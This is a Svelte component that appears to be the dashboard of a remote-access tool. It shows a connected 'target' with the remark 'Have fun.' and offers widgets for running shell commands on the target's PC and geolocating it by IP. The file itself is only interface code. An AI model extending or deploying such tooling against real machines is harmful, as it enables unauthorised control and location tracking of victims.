<script lang="ts">
  import { Link, Route, Router, useParams } from 'svelte-navigator';
  import { Api } from '../api';
  import type { Socket } from '../api';
  import { onMount } from 'svelte';
  import { secondsToString } from '../util';
  import Widget from '../Widget.svelte';
  import Shell from './widgets/Shell.svelte';
  import Locate from './widgets/Locate.svelte';

  const params = useParams();

  let socket: Socket;
  let time = 0;

  onMount(async () => {
    try {
      socket = await Api.target($params.id);
      time = Math.round(
        (new Date(Date.now()).getTime() - socket.up.getTime()) / 1000
      );

      setInterval(() => {
        time++;
      }, 1000);
    } catch (err) {
      console.error(err);
    }
  });

</script>

<Router>
  <main>
    {#if socket}
      <h1>
        Currently viewing <span class="name">{socket.name}</span>. Have fun.
      </h1>
      <h3>Up for {secondsToString(time)}</h3>
      <Route path="/">
        <div class="widgets">
          <Widget
            title="Shell"
            description="Write shell commands that will run on the target's pc. Works on Unix-based OS as well now!"
            icon="/assets/cli.svg"
          />
          <Widget
            title="Locate"
            description="Get the coordinates of the target's pc from its IP address."
            icon="/assets/marker.svg"
          />
        </div>
      </Route>

      <Route path="shell">
        <Shell {socket} />
      </Route>
      <Route>
        <Locate {socket} />
      </Route>
    {/if}
  </main>
</Router>

<style>
  main {
    color: var(--light-0);
  }

  .name {
    color: var(--light-2);

    text-decoration: underline;
  }

  :global(.hint) {
    color: var(--light-0);

    font-style: italic;
  }

</style>
